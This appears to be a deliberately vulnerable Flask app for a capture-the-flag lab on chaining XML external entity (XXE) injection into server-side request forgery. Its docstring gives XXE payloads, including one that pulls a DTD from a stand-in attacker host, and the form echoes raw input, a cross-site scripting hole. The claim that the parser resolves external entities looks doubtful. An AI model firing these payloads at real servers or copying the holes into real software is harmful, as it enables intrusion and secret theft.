"""
XXE Lab 11: XXE + SSRF Combined
Difficulty: 3 (Advanced)
Points: 100

Description:
XXE enabling SSRF to internal services.
"""

from flask import Flask, request
import xml.etree.ElementTree as ET
import requests

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def index():
    """
    VULNERABLE: XXE to SSRF chain
    
    Attack Vector:
    Stage 1: XXE fetches internal URL
    <?xml version="1.0"?>
    <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://localhost:5000/admin">]>
    <foo>&xxe;</foo>
    
    Or with DTD:
    <!DOCTYPE foo [
        <!ENTITY % file SYSTEM "http://127.0.0.1:8080/api/secrets">
        <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
        %dtd;
    ]>
    
    Stage 2: Access internal services
    Fetch from: http://internal-api:5000/v1/users
    Fetch from: http://192.168.1.1:8080/admin
    
    Flag: FLAG{xxe_plus_ssrf_011}
    """
    xml_input = request.form.get('xml', '')
    result = None
    error = None
    
    if xml_input:
        try:
            root = ET.fromstring(xml_input)
            result = ET.tostring(root, encoding='unicode')
        except Exception as e:
            error = str(e)
    
    return f"""
    <html>
    <body>
        <h1>XXE + SSRF Combined</h1>
        <form method="POST">
            <textarea name="xml" rows="10" cols="60">{xml_input}</textarea>
            <button>Parse</button>
        </form>
        {f"<pre>{result}</pre>" if result else ""}
        {f"<p style='color:red;'>{error}</p>" if error else ""}
    </body>
    </html>
    """

@app.route('/admin')
def admin():
    return "ADMIN PANEL: SECRET_API_KEY=sk_live_1234567890"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5011, debug=False)
